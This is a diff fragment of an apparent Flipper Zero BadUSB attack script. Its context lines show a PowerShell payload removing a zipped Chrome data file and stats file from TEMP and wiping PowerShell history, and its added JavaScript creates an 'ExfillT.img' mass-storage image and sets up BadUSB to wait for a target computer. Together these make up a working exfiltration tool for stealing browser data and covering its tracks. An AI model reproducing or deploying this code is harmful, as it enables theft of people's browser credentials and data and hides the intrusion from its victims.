@@ -141,3 +141,30 @@ Remove-Item "$env:TEMP\stats.txt", "$env:TEMP\ChromeData.zip"
 # Clean up PowerShell history
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 exit
+
+# --- MASS STORAGE FUNCTIONS ADDED ---
+let image = "/ext/apps_data/mass_storage/ExfillT.img";
+let size = 8 * 1024 * 1024;
+let command = "";
+for (let i = 0; i < script.length; i++) {
+    command += script[i];
+}
+
+let badusb = require("badusb");
+let usbdisk = require("usbdisk");
+let storage = require("storage");
+
+print("Checking for Image...");
+if (storage.exists(image)) {
+    print("Storage Exists.");
+} else {
+    print("Creating Storage...");
+    usbdisk.createImage(image, size);
+}
+
+badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
+print("Waiting for connection");
+
+while (!badusb.isConnected()) {
+    delay(1000);
+}
